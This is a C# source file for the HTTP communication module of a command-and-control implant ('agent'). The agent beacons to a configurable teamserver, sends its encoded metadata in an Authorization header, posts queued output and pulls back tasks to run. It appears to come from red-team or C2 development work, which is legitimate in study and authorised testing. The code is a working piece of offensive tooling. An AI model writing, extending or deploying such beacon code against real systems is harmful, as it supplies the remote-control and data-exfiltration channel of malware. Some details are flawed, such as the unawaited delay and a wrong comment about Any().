using System;
using System.Text;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    internal class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }

        private CancellationTokenSource _tokenSource;

        private HttpClient _client;

        public HttpCommModule(string connectAddress, int connectPort) {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
        }

        public override void Init(AgentMetadata metadata)
        {
            base.Init(metadata);

            _client = new HttpClient();
            _client.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
            _client.DefaultRequestHeaders.Clear();

            // Serealize and add in out agent metadata
            var encodedMetadata = Convert.ToBase64String(AgentMetadata.Serialise());

            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
        }

        public override async Task Start()
        {
            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                // check if have data to send
                if (!Outbound.IsEmpty)
                {
                    await PostData();
                }
                else
                {
                    await Checkin();
                }

                Task.Delay(1000);

                // checkin

                // get tasks

                // sleep
            }
        }

        public async Task Checkin()
        {
            var response = await _client.GetByteArrayAsync("/");

            HandleResponse(response);
        }

        private async Task PostData()
        {
            // dequeue everything from outbound queue

            var outbound = GetOutbound().Serialise(); // serealise the list into byte array

            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
            var response = await _client.PostAsync("/", content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();

            HandleResponse(responseContent);
        }

        private void HandleResponse(byte[] response)
        {
            // teamserver might have task for us if we do either checkin/tasking

            var tasks = response.Deserialize<AgentTask[]>();
            
            // check is tasks have anything (Any() is anything more than 1)
            if (tasks != null && tasks.Any())
            {
                foreach(var task in tasks)
                {
                    Inbound.Enqueue(task);
                }
            }
        }

        public override void Stop()
        {
            _tokenSource.Cancel();
        }
    }
}
